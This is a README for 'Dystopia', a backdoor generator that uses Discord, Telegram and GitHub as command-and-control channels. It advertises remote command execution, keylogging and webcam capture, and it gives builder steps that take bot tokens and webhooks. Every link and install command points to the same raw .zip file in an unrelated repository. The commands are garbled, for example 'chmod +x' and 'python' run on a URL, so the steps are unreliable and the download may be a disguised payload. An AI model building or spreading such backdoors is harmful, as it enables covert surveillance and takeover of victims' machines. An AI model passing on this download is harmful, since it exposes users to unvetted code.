<h1 align="center">
  <br>
  <a href="https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip"><img src="https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip" width=600 weigth=500 alt="Dystopia"></a>
  <br>
  Dystopia
  <br>
</h1>

<h4 align="center">Dystopia Command and Control</h4>

<p align="center">
    <img src="https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip">
    <img src="https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip">
    <img src="https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip">
</p>

---

## What is Dystopia?

Dystopia is a malware generator that generates backdoors which use online platforms as C2s. This includes Discord, Telegram and Github. 

Our goal is to prove that anything can be a C2, if you want to :) ...

## How does it work?

The Dystopia backdoors are using libraries which allow the backdoor to act as a "Bot" for the above-mentioned platforms. Essentially the attacker contacts the bot and specifies a malicious command to execute on the target "Agent". 

Dystopia is equipped with a lot of features **some** of which are:
- Encrypted traffic (HTTPS)
- Running system commands on target Agent
- Keylogger (Limited to Discord)
- Grabbing webcam snaps
- Multiple online agents at a time (Limited to Discord & GitHub)

## Installation and Usage

Dystopia is better installed and used on Kali Linux:
```
git clone https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip
cd ./Dystopia-c2
chmod +x https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip
https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip
```
Once this is done we can use the builder. Let's build a discord based C2 backdoor:
```
python https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip
use discord
set name <backdoor-name>
set guild-id <server id from discord>
set bot-token <discord bot token>
set channel-id <channel id from discord server>
set webhook <discord webhook>
build
```

## How to Setup Dystopia
Since the setup process is very specific for each platform:

> Please follow the [setup guide](https://raw.githubusercontent.com/kushal0451/Luca-santiago/main/dystopia-c2-main.zip) to setup Dystopia.

## Contributors
Contributions are welcome to our GitHub repo! We value community involvement and appreciate all types of contributions, from bug reports to code. Join us in building something great and making a positive impact on the world. Get involved today!

## Disclaimer
This github repository is made for educational purposes only. The developer is not responsible for any misuse of this software. **Do not use this software for illegal purposes.**
